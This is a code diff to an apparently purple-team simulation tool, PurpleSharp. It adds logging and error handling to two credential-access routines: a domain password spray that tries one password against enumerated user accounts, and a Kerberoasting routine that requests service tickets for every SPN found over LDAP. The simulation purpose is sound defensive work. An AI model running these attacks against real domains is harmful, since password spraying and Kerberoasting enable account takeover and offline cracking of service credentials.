@@ -12,44 +12,62 @@ namespace PurpleSharp.Simulations
     public class CredAccess
     {
 
-        public static void LocalDomainPasswordSpray(int usertype, int nuser, int protocol, int sleep, string password)
+        public static void LocalDomainPasswordSpray(int usertype, int nuser, int protocol, int sleep, string password, string log)
         {
+
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.TimestampInfo(String.Format("Starting T1110 Simulation on {0}", Environment.MachineName));
+            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
             bool Kerberos = new bool();
-            List<User> usertargets = Lib.Targets.GetUserTargets(usertype, nuser);
+            try
+            {
+                List<User> usertargets = Lib.Targets.GetUserTargets(usertype, nuser);
+                switch (protocol)
+                {
+                    case 1:
+                        Kerberos = true;
+                        break;
+
+                    case 2:
+                        Kerberos = false;
+                        break;
+
+                    default:
+                        return;
+                }
+                //Console.WriteLine("[*] Obtained {0} user accounts", usertargets.Count);
+                logger.TimestampInfo(String.Format("Obtained {0} user accounts", usertargets.Count));
+                String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
+                if (usertype == 7) domain = ".";
+                //Console.WriteLine("[*] Starting Domain Password Spray Attack on {0}", Environment.MachineName);
+                logger.TimestampInfo(String.Format("Executing a Local Domain Password Spray Attack"));
+                if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);
+                foreach (var user in usertargets)
+                {
+                    if (Kerberos)
+                    {
+
+                        CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 0, logger);
+                        if (sleep > 0) Thread.Sleep(sleep * 1000);
+                    }
+                    else
+                    {
+                        CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 2, logger);
+                        if (sleep > 0) Thread.Sleep(sleep * 1000);
+                    }
+                }
+                logger.TimestampInfo("Success");
+            }
+            catch (Exception ex)
+            {
+                //logger.TimestampInfo(ex.ToString());
+                logger.TimestampInfo(ex.Message.ToString());
+                logger.TimestampInfo("Failed");
+            }
+
 
             
-            switch (protocol)
-            {
-                case 1:
-                    Kerberos = true;
-                    break;
-
-                case 2:
-                    Kerberos = false;
-                    break;
-
-                default:
-                    return;
-            }
-            Console.WriteLine("[*] Obtained {0} user accounts", usertargets.Count);
-            String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
-            if (usertype == 7) domain = ".";
-            Console.WriteLine("[*] Starting Domain Password Spray Attack on {0}", Environment.MachineName);
-            if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);
-            foreach (var user in usertargets)
-            {
-                if (Kerberos)
-                {
-
-                    CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 0);
-                    if (sleep > 0) Thread.Sleep(sleep * 1000);
-                }
-                else
-                {
-                    CredAccessHelper.LogonUser(user.UserName, domain, password, 2, 2);
-                    if (sleep > 0) Thread.Sleep(sleep * 1000);
-                }
-            }
 
         }
 
@@ -125,19 +143,34 @@ namespace PurpleSharp.Simulations
             }
         }
 
-        public static void Kerberoasting(int sleep = 0)
+        public static void Kerberoasting(string log, int sleep = 0)
         {
-            Console.WriteLine("[*] Starting Kerberoast attack from {0}", Environment.MachineName);
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.TimestampInfo(String.Format("Starting T1208 Simulation on {0}", Environment.MachineName));
+            logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
             if (sleep > 0) Console.WriteLine("[*] Sleeping {0} seconds between attempt", sleep);
-            //NetworkCredential cred = null;
-            List<String> spns;
-            spns = Ldap.GetSPNs();
 
-            foreach (String spn in spns)
+            try
             {
-                SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "");
-                if (sleep > 0 ) Thread.Sleep(sleep * 1000);
+                //NetworkCredential cred = null;
+                List<String> spns;
+                spns = Ldap.GetSPNs();
+
+                foreach (String spn in spns)
+                {
+                    Lib.SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
+                    if (sleep > 0) Thread.Sleep(sleep * 1000);
+                }
+                logger.TimestampInfo("Success");
+
             }
+            catch (Exception ex)
+            {
+                logger.TimestampInfo("Failed");
+                logger.TimestampInfo(ex.Message.ToString());
+            }
+
 
         }
 
